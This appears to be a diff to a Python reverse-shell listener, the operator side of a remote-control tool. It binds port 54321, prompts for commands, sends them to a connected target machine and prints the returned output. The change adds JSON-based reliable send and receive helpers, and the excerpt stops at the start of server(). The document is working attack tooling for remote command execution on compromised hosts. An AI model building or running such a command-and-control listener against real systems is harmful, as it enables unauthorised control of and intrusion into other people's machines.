@@ -1,26 +1,40 @@
 #!/usr/bin/python3
 import socket
 from termcolor import colored
-
+import json
 
 addr = None
 HOST = ''
 PORT = 54321
 
 
+def reliable_send(_target, _cmd):
+	json_data = json.dumps(_cmd)
+	_target.sendall(json_data.encode('UTF-8'))
+
+
+def reliable_recv(_target):
+	data = ""
+	while True:
+		try:
+			data = data + (_target.recv(1024)).decode('UTF-8')
+			return json.loads(data)
+		except ValueError:
+			continue
+
+
 def shell(_s, _target, _addr):
 	while True:
-		command = input('* Shell#~%s: ' % str(_addr))
-		_target.sendall(command.encode('UTF-8'))
-		if command == 'q':
+		cmd = input('* Shell#~%s: ' % str(_addr))
+		reliable_send(_target, cmd)
+		if cmd == 'q':
 			print(colored('[-] You decided to exit', 'red'))
 			_target.close()
 			_s.close()
 			break
 		else:
-			result = _target.recv(1024)
-			print('Received Message: ', result.decode('UTF-8'))
-
+			result = reliable_recv(_target)
+			print('Received Message: ', result)
 
 
 def server():
